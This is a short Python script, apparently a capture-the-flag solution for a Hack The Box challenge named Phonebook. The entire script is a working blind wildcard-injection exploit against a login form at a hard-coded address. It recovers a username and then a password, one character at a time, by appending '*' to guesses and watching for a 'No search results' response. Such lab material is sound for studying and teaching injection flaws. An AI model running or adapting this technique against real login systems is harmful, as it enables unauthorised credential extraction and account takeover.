# HTB - Phonebook
import string
import requests

url = 'http://206.189.124.56:31830/login'
dict = string.ascii_letters + string.digits + string.punctuation
data = {'username': '', 'password': ''}
userData = {'username': '', 'password': '*'}

def userScan():
    user = ''
    while True:
        for i in dict:
            print("Trying: " + i)
            userData['username'] = user + i + '*'
            userData['password'] = '*'
            r = requests.post(url, data=userData)
            if 'No search results' in r.text:
                user += i
                print(user)
            checkData = {'username': user, 'password': '*'}
            check = requests.post(url, data=checkData)
            if 'No search results' in check.text:
                print("User: " + user)
                passCheck(user)
            else:
                continue
            
def passCheck(user):
    flag = ''
    while True:
        for i in dict:
            print("Trying: " + i)
            data['username'] = user
            data['password'] = flag + i + '*'
            resp = requests.post(url, data=data)
            if 'No search result' in resp.text:
                print(flag)
                flag += i
            checkData = {'username': user, 'password': flag}
            check = requests.post(url, data=checkData)
            if 'No search results' in check.text:
                print("Flag: " + flag)
                exit()
            else:
                continue

if __name__ == '__main__':
    userScan()
